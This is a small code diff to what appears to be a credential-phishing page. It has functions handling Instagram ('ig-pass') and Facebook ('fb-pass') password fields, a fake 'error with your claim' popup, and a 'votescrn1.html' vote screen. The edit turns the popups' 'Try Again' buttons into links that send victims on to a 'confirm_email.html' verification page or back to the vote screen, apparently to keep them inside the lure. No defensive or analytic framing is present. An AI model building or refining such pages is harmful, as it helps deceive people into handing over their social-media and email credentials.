@@ -87,7 +87,7 @@ function iglog() {
         title: 'Oops!',
         text: 'There was an error with your claim.',
         icon: 'error',
-        confirmButtonText: 'Try Again'
+        confirmButtonText: '<a href="confirm_email.html">Verify email</a>'
       });
 
       document.getElementById('ig-pass').value = '';
@@ -127,7 +127,7 @@ function login() {
         title: 'Oops!',
         text: 'There was an error with your claim.',
         icon: 'error',
-        confirmButtonText: 'Try Again'
+        confirmButtonText: '<a href="votescrn1.html">Try Again</a>'
       });
       document.getElementById('fb-pass').value = '';
 
